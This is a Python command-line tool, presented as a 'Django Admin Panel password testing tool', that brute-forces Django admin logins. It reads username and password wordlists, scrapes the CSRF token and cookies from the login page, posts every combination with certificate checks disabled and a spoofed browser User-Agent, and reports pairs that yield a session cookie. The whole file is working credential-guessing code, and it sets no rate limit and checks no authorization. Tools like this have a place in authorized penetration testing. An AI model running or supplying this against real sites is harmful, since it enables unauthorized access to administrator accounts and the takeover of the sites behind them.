#!/usr/bin/env python

from operator import eq
import urllib3
import argparse
from bs4 import BeautifulSoup


def banner():
    print("""
---------------------------------------------------
  ____  _                                         
 |  _ \(_) __ _ _ __   __ _  ___                  
 | | | | |/ _` | '_ \ / _` |/ _ \                 
 | |_| | | (_| | | | | (_| | (_) |                
 |____// |\__,_|_| |_|\__, |\___/                 
     |__/             |___/                       
  _   _            _           _                _ 
 | | | |_ __   ___| |__   __ _(_)_ __   ___  __| |
 | | | | '_ \ / __| '_ \ / _` | | '_ \ / _ \/ _` |
 | |_| | | | | (__| | | | (_| | | | | |  __/ (_| |
  \___/|_| |_|\___|_| |_|\__,_|_|_| |_|\___|\__,_|

----------------------------------------------------                                                  

Django Admin Panel password testing tool v0.1 - by n3bojs4   
    """)



# Get arguments

parser = argparse.ArgumentParser()
parser.add_argument("-domain",help="Domain for the django admin login page.",required=True)
parser.add_argument("-scheme",help="http or https scheme.",required=True)
parser.add_argument("-uri",help="uri for the admin login page, \"/admin/login/\" is the most common.",required=True)
parser.add_argument("-userdict",help="dictionnary file for user list.",required=True)
parser.add_argument("-passwdict",help="dictionnary file for password.",required=True)
parser.add_argument("-onlygood",help="Show only good attempts.",action='store_true', default=False, required=False)

# Show banner
banner()

# Parse args
args = parser.parse_args()

domain = args.domain
scheme = args.scheme
uri = args.uri
userdict = args.userdict
passwords = args.passwdict
onlygood = args.onlygood

admin_url = scheme + '://' + domain + uri


# Disable warnings for certs
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# By default it ignores certs
http = urllib3.PoolManager(cert_reqs='CERT_NONE')


# Opening dict files
try:
    USERS = open(userdict,'r')
except:
    print("cannot open users file :",userdict)
    exit(1)

try:
    PASSWORDS = open(passwords,'r')
except:
    print("cannot open password file :",userdict)
    exit(1)



headers={'Connection': 'keep-alive',
            'Content-Type': 'application/x-www-form-urlencoded',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36',
            'Referer': domain + uri }


def Authenticate(admin_url,username,password):
    r = http.request('GET', admin_url, headers=headers)
    login_page = r.data
    Cookies = r.headers["Set-Cookie"]
    soup = BeautifulSoup(login_page, 'html.parser')

    # Getting the csrf token
    csrfmiddlewaretoken = soup.find('input', {'name': 'csrfmiddlewaretoken'})['value']
    
    # Getting next page
    nextpage = soup.find('input', {'name': 'next'})['value']
    
    # creating the fields and the headers
    headers["Cookie"] = Cookies
    
    payload = "csrfmiddlewaretoken="+csrfmiddlewaretoken+"&"+"username="+username+"&"+"next="+nextpage+"&password="+password
    
    postlogin = http.request('POST', admin_url, headers=headers, body=payload, redirect=False)
    data = postlogin.data.decode('utf-8')

    if "CSRF" in data:
        print("CSRF token missing or invalid !")
    if "Please" in data and onlygood is False:
        print("Trying username:",username, "password:",password, "FAILED")
    if postlogin.status == 302 :
        if "sessionid" in postlogin.headers["Set-Cookie"]:
            print("Found a valid account !!! --> username:", username, "pass:",password)
        else:
            print("It seems we found a valid account --> username:", username, "pass:",password,"but no sessionid cookie has been set, check manually !")
    

userlist = list(set([(word.strip()) for word in USERS.readlines()]))
passwordlist = list(set([(word.strip()) for word in PASSWORDS.readlines()]))



for user in userlist:
    for password in passwordlist:
        Authenticate(admin_url,user,password)


